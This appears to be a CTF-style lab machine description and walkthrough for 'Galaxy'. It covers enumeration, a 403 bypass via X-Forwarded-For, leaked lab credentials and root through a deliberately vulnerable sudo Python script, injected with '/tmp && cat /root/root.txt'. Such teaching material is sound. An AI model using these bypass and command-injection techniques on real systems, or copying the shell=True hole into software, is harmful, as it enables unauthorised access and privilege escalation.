# [Galaxy]

## Introduction

Galaxy is easy level machine In this challenge, machine hosting a beta website about facts. The site was vulnerable to bypassing the 403 Forbidden restriction using the X-Forwarded-For header. After successfully bypassing the restriction, I accessed the "doston" user account, where their password was leaked. The "doston" user had a custom .sh file that, we can exploit rce.

## Info for HTB

### Access

Passwords:

| User  | Password                            |
| ----- | ----------------------------------- |
| doston | Ab401c |
| root  | root8618 |

### Key Processes

1) SSH server on 22 port
2) Apache2 server on 80 port which is vulnerable to http host header
3) There is custom copy.sh file in doston user's home directory which is vulnerable to rce

### Automation / Crons
There is no automation

### Firewall Rules

There is no firewall rule

### Docker

There is no docker

### Other

1)I made my own ip address to redirect to galaxy.htb in /etc/apache2/sites-avialabel/000-default.conf<br>
2) I specifically made doston user unable to see following directory and files: <br>/etc/passwd<br> /etc/shells/<br> /home (but can access it's own directory)<br> /var


# Writeup

# Enumeration

We begin enumeration with nmap tools from ports of target:<br>
`sudo nmap -sC -sV 192.168.2.110 -p- --min-rate=1000 -T4`<br>
`-sC` This flag for basic scripting<br>
`-sV` This flag for to check version<br>
`-p-` To check all ports we do not want to miss any<br>
`-T4` This flag to make scaning slightly faster (default -T3 when you don't specify)<br>
`--min-rate=1000` This is minimum rate of nmap packets<br>

![image](https://github.com/user-attachments/assets/0ceb7925-bc85-46b2-a07c-a15b77d72ce6)

We can see there are 22 and 80 port open. Website has galaxy.htb domain we need to add that domain with it's IP to our /etc/hosts file :<br>
```
echo "192.168.2.110       galaxy.htb" | sudo tee -a /etc/hosts
```
Website looks like blog about cosmos and it is in beta version
<br>
<br>
![image](https://github.com/user-attachments/assets/402a2623-84b0-4d82-97a7-1fbe5681ee21)

Let's enumerate directories and subdirectories using ffuf tool:<br>
```
ffuf -u http://galaxy.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
```
<br>
We find /developers and /photos directories and /developers directory gives us 403 forbidden error<br>

![image](https://github.com/user-attachments/assets/27c54f85-4952-4b13-8040-9c07dea34883)
<br>
Trying to enumerate any subdomains other directory leads us nothing. So we try to find a way to access /developers directory.<br>
Googling 403 bypass error we find [this](https://github.com/justdoston/403-Bypass) documentation.<br>
According to documentation trying to add forward headers with 127.0.0.1 ip will work, because server will think user trying to access from internal IP address.<br>

Let's use proxy forwarding tool such as burp suite to manupulate and try this technique.<br>
![image](https://github.com/user-attachments/assets/605568f6-ecb7-4b28-a860-f5d9f7f40430)


`X-Forwarded-For: 127.0.0.1` header successfuly worked to bypass<br>
![image](https://github.com/user-attachments/assets/c1ed7ece-f4d2-46d1-a9d2-8d07ddd472b6)


# Foothold

We use same technique to see content of README.md file:<br>
![image](https://github.com/user-attachments/assets/7533a024-0629-49f8-8040-4c65d5140d79)
<br>
Not much usefull let's take a look to devs.txt file<br>
```
user pass of developers who working to build this website

doston:Ab401c *
john:sfheie32 
mark:dfgid23 
akmal:shgj62
```
<br>
Now we have credentials let's try doston user to login with ssh<br>

![image](https://github.com/user-attachments/assets/afb30792-72f1-4ba8-9bcb-2b82cd112ed4)
<br>
We are in! user flag can be found from /home/doston/user.txt <br>
doston user has limited and restricted access which is not default. We can not enumerate web directory nor we can not know possible usernames for lateral movement.<br>
![image](https://github.com/user-attachments/assets/1a9203e6-5794-4822-8575-e9d801120e3f)
<br>
But our user allowed to run copy.sh file as sudo without password:<br>
`sudo -l`<br>
```
$ sudo -l
Matching Defaults entries for doston on galaxy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User doston may run the following commands on galaxy:
    (ALL) NOPASSWD: /home/doston/copy.sh
```
Let's analyze content of copy.sh file:<br>
```
#!/usr/bin/python
import os
import shutil
import stat
import subprocess  

def main():

   
    file_path = input("Enter the full path of the file to copy: ")
 
    target_dir = input("Enter full path of the directory to paste: ")


   
    if not file_path.startswith('/home/doston/'):
        print("Error: Only files from /home/doston directory are allowed.")
        return

    
    if os.path.islink(file_path):
        print("Error: The file is a symlink and cannot be copied.")
        return

    
    inode_count = os.stat(file_path).st_nlink
    if inode_count > 1:
        print("Error: The file is a hard link and cannot be copied.")
        return

    try:
        
        print(f"Attempting to copy the file from {file_path} to {target_dir}")
       
        subprocess.run(f"cp {file_path} {target_dir}", shell=True, check=True)
        print(f"File successfully copied to {target_dir}.")
    except subprocess.CalledProcessError as e:
        print(f"Error: Failed to copy the file. {e}")

if __name__ == "__main__":
    main()
```
This script written python code which asks file and location to copy if we look at it it uses shell and os commands to copy file which is dangerous !<br>
Take a look at this part:
`subprocess.run(f"cp {file_path} {target_dir}", shell=True, check=True)`
This line of code uses shell to copy file with `cp` command but it is vulnerable to remote code execution!<br>
When script asks target directory to copy file we can add extra command after directory like:<br>
`/tmp && cat /root/root.txt` and we have root flag!

